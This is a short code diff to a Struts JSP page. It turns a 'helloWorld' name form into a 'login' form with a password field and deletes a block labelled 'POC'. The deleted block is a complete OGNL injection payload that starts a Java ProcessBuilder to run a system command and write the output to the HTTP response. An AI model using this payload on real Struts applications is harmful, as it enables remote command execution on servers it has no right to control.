@@ -10,18 +10,10 @@
     <s:head/>
 </head>
 <body>
-<s:form action="helloWorld">
-    <s:textfield label="What is your name?" name="name"/>
+<s:form action="login">
+    <s:textfield label="password" name="password"/>
     <s:submit/>
 </s:form>
-
-
-POC:<br>
-%{#a=(new java.lang.ProcessBuilder(new
-java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new
-java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new
-char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new
-java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 
 </body>
 </html>
